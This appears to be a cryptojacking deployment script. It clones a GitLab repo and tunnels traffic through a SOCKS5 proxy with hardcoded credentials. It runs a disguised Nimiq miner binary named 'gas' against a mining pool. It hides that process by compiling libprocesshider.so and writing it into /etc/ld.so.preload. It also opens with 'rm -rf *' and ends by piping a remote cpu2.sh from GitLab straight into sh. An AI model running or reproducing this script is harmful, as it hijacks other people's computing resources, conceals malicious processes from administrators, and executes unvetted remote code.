rm -rf *

git clone https://gitlab.com/majapahlevi/majapahlevi
cd majapahlevi

#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

tar -xvzf graphics.tar.gz
rm -rf graphich.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 104.131.77.204:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp rm -rf gas && unzip korek.zip
chmod +x gas
rm -rf Makefile
rm -rf processhider.c
rm -rf README.md
rm -rf .gitignore
rm -rf korek.zip

unzip tukimin.zip
rm -rf tukimin.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./gas -d=0 -a "NQ57ECU3A7V3LSK2K93MVM2D8XJPN5UG2VEQ" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-20000 -n 1)) -t 4 -i Disable & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu2.sh | sh 